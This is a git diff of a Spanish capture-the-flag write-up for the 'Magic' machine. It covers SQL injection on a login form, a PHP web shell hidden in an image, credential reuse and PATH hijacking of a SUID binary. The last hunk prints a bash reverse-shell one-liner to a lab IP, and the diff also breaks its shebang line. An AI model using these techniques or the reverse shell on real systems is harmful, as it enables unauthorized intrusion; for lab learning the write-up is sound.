@@ -3,7 +3,7 @@
 ![](../../../../~gitbook/image.md)Publicado: 05 de Junio de 2025
 Autor: José Miguel Romero aKa x3m1Sec
 Dificultad: ⭐ Medium
-###📝 Descripción
+### 📝 Descripción
 Magic es una máquina Linux de dificultad media que presenta un portal web para un portfolio fotográfico con un panel de administración vulnerable. La explotación inicial se logra mediante una inyección SQL en el formulario de login, seguida de una subida de archivo maliciosa que permite la ejecución remota de comandos. Para el movimiento lateral, se aprovechan credenciales encontradas en archivos de configuración de la base de datos. La escalada de privilegios se consigue mediante un ataque de PATH hijacking en un binario SUID personalizado que ejecuta comandos del sistema sin especificar rutas absolutas.Técnicas utilizadas:- SQL Injection (UNION-based)
 - File Upload Bypass
 - Web Shell Upload
@@ -12,36 +12,36 @@ Magic es una máquina Linux de dificultad media que presenta un portal web para 
 - PATH Hijacking
 - SUID Binary Exploitation
 
-###🔭 Reconocimiento
+### 🔭 Reconocimiento
 
-####Ping para verificación en base a TTL
+#### Ping para verificación en base a TTL
 💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
-####Escaneo de puertos TCP
+#### Escaneo de puertos TCP
 
-####Enumeración de servicios
+#### Enumeración de servicios
 ⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
-###🌐 Enumeración Web
+### 🌐 Enumeración Web
 
-####80 HTTP
+#### 80 HTTP
 Enumeramos el servicio web para descubrir un sitio web para un portfolio que aloja imágenes como contenido desarrollado con Magic (https://github.com/once-ui-system/magic-portfolio). Hay un formulario de Login, aunque a priori no vemos ninguno de registro:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
-####Fuzzing de directorios
+#### Fuzzing de directorios
 Tras probar a realizar fuzzing de directorios con dirsearch, gobuster y feroxbuster, no logramos enumerar nada que podamo usar como un potencial vector de ataque:
-####💉 SQLi en Panel de login
+#### 💉 SQLi en Panel de login
 Nos queda por analizar el panel de login y ver si es vulnerable a una posible inyección SQL.
 Probando con credenciales por defecto de tipo admin:admin admin:Admin123 o admin:Password1 obtenemos una alerta de javascript indicando que las credenciales no son válidas:![](../../../../~gitbook/image.md)Sin embargo, si probamos a introducir un carácter ' para verificar una posible inyección sql, no obtenemos ningún error, lo cual nos hace pensar que algo está ocurriendo el backend a la hora de procesar la solicitud.Probamos con una SQLi de tipo unión usando el siguiente payload:Y tampoco obtenemos error, por lo que parece funcionar. Lo único que debemos es ajustar el número de columnas en el payload hasta encontrar el número correcto. que tenga la tabla. Probamos con 3 valores y bingo! estamos dentro!![](../../../../~gitbook/image.md)Hemos logrado acceder y tenemos acceso al módulo de carga de archivos. Analicemos qué tipo de extensiones están permitidas de cara a una posible subida de una webshell para explotar una RCE![](../../../../~gitbook/image.md)Una alerta javascript ya nos deja claro que solo se admiten archivos con las extensiones de imagen que se indican.
-####📤 File Upload Bypass y RCE
+#### 📤 File Upload Bypass y RCE
 Procedemos a crear una imagen dummy pero cuyo contenido sea válidoA continuación embebemos una php shell en la imagen que hemos creado anteriormenteVerificamos el tamaño y el mime type para asegurarnos de que cumpla con las condiciones necesarias para pasar los filtros de validación:Renombramos el archivoInterceptamos la petición con burp y cambiamos el nombre del archivo shell.jpg por shell.php.jpg![](../../../../~gitbook/image.md)Obtenemos un mensaje de que la imagen se ha subido correctamente.![](../../../../~gitbook/image.md)Ahora nos queda saber donde se ha almacenado la imagen. Revisando el código fuente del home de la aplicación vemos la ruta donde están almacenadas las imágenes que ya existen actualmente:![](../../../../~gitbook/image.md)Usamos esa ruta para referenciar nuestra imagen de la siguiente forma y probar la ejecución remota de comandos:![](../../../../~gitbook/image.md)Ahora, cambiamos el payload para tratar de ganar acceso a la máquina de Magic. En primer lugar iniciamos un listener:NOTA: Tuve que volver a subir la webshell ya que cada vez que ejecutaba un comando me borraba el archivo de la máquina.Ganamos acceso a la máquina Magic![](../../../../~gitbook/image.md)
-####🔄 Movimiento Lateral
+#### 🔄 Movimiento Lateral
 Encontramos un usuario llamado theseus en la máquina aunque no podemos leer la flag que se encuentra en su directorioContinuamos enumerando la máquina en busca de un potencial vector que nos permita realizar un movimiento lateral para ganar acceso como usuario theseus. Encontramos credenciales en el archivo `db.php5` del directorio `/var/www/Magic`![](../../../../~gitbook/image.md)En primer lugar comprobamos si theseus está reutilizando esta contraseña con su usuario del sistema pero verificamos que no.
-####🗃️ Enumeración de Base de Datos
+#### 🗃️ Enumeración de Base de Datos
 Vemos si hay una base de datos ejecutándose de forma local y podemos ganar acceso a ella:Tratamos de conectarnos a la base de datos y encontramos un problema, el cliente mysql no está instalado en la ḿaquina:Valoré la opción de usar chisel para realizar port forwading, pero se me ocurrió realizar una búsqueda en el sistema para ver qué opciones aparecían buscando mysql:Buscando información en la red, encontré que se puede usar mysqldump usando la siguiente sintaxis para realizar un dump de la base de datosObtenemos una nueva credencial `Th3s3usW4sK1ng`. Veamos si esta sí está siendo reutilizada por el usuario theseus, tal como parece indicar por el nombre.Ahora sí, logramos movernos lateralmente y ganar acceso como theseus y capturar la primera flag:
-####🚀 Escalada a root
+#### 🚀 Escalada a root
 Comprobamos que theseus no puede ejecutar nada como root
-####🔍 Enumeración de binarios SUID
+#### 🔍 Enumeración de binarios SUID
 Enumeramos binarios con permisos SUID:Entre los resultados, hay uno que no es habitual![](../../../../~gitbook/image.md)
-####🛠️ Análisis del binario sysinfo
+#### 🛠️ Análisis del binario sysinfo
 Ejecutar Sysinfo con Ltrace imprime las llamadas realizadas fuera del binario. La salida es enorme pero hay una línea que destaca:![](../../../../~gitbook/image.md)Popen es otra forma de abrir un proceso en Linux. El binario está haciendo una llamada a fdisk, lo cual está bien, excepto que lo está haciendo sin especificar la ruta completa. Esto deja al binario vulnerable a un ataque de PATH hijacking.
-####🎯 PATH Hijacking
+#### 🎯 PATH Hijacking
 Creamos nuestro payload en /dev/shm (todo lo que hay en él se borra al reiniciar la máquina) con una bash shell one linerNOTA: importante darle permisos de ejecución al binario que usamos como payload.Ahora modificamos el path para que cuando el script busque la herramienta fdisk con la ruta de forma relativa encuentre en primer lugar lo que hay en /dev/shm y se ejecute primero:Iniciamos un listener con netcatLanzamos el binario /bin/sysinfo y ganamos acceso como root![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
 - [🔭 Reconocimiento](#reconocimiento)
 - [🌐 Enumeración Web](#enumeracion-web)
@@ -324,7 +324,7 @@ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.3/443 0>&1' > fdisk
 
 ```
 theseus@magic:/dev/shm$ cat fdisk
-#!/bin/bash
+# !/bin/bash
 
 bash -i >& /dev/tcp/10.10.14.3/443 0>&1
 theseus@magic:/dev/shm$
